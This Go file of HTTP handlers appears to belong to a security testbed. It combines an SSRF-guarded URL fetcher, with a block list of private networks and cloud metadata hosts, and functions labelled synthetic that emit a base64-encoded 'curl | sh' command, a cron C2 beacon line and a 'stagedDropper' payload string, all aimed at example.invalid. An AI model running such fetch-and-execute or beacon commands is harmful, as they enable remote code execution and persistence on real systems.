package handlers

import (
	"encoding/base64"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// privateNets lists CIDR ranges that must not be reached by user-controlled URLs.
var privateNets []*net.IPNet

func init() {
	for _, cidr := range []string{
		"10.0.0.0/8",
		"172.16.0.0/12",
		"192.168.0.0/16",
		"127.0.0.0/8",
		"169.254.0.0/16",
		"0.0.0.0/8",
		"100.64.0.0/10",
		"::1/128",
		"fc00::/7",
		"fe80::/10",
	} {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err == nil {
			privateNets = append(privateNets, ipNet)
		}
	}
}

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")

	parsed, err := url.Parse(source)
	if err != nil || strings.ToLower(parsed.Scheme) != "https" {
		http.Error(w, "invalid url: only https scheme is allowed", http.StatusBadRequest)
		return
	}

	if isPrivateHost(parsed.Hostname()) {
		http.Error(w, "invalid url: host not allowed", http.StatusBadRequest)
		return
	}

	resp, err := http.Get(source)
	if err != nil {
		log.Printf("FetchTool: fetch error: %v", err)
		http.Error(w, "fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("FetchTool: create error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		log.Printf("FetchTool: copy error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

// isPrivateHost returns true for loopback, link-local, cloud-metadata, and private
// network hostnames or IP addresses.
func isPrivateHost(host string) bool {
	// Block well-known metadata endpoints.
	lower := strings.ToLower(host)
	for _, blocked := range []string{"localhost", "metadata.google.internal", "metadata.azure.com"} {
		if lower == blocked {
			return true
		}
	}

	// If the host parses as an IP address, check against private CIDR ranges.
	ip := net.ParseIP(host)
	if ip != nil {
		for _, network := range privateNets {
			if network.Contains(ip) {
				return true
			}
		}
		return false
	}

	// Resolve the hostname and check each resolved IP.
	addrs, err := net.LookupHost(host)
	if err != nil {
		// Cannot resolve; block the request.
		return true
	}
	for _, addr := range addrs {
		ip := net.ParseIP(addr)
		if ip == nil {
			return true
		}
		for _, network := range privateNets {
			if network.Contains(ip) {
				return true
			}
		}
	}
	return false
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
